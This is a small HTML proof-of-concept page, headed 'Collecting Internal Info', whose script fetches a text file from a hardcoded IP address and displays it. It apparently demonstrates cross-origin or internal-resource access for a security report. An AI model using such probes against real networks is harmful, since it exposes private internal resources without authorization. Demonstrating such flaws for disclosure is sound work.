<!DOCTYPE html>
<html>
  <head><meta charset="UTF-8"><title>PoC</title></head>
  <body>
    <h1>Collecting Internal Info</h1>
    <div id="output">Loading...</div>

    <script>
      const paths = [
        "http://44.203.154.8/releasenotes.txt"
      ];

      const out = document.getElementById('output');

      (async () => {
        for (const url of paths) {
          try {
            const res = await fetch(url);
            const text = await res.text();
            const safe = text.replace(/</g, "&lt;").slice(0, 500);
            out.innerHTML += `<h3>${url}</h3><pre>${safe}</pre>`;
          } catch (e) {
            out.innerHTML += `<h3>${url}</h3><pre>ERROR: ${e.message}</pre>`;
          }
        }
      })();
    </script>
  </body>
</html>
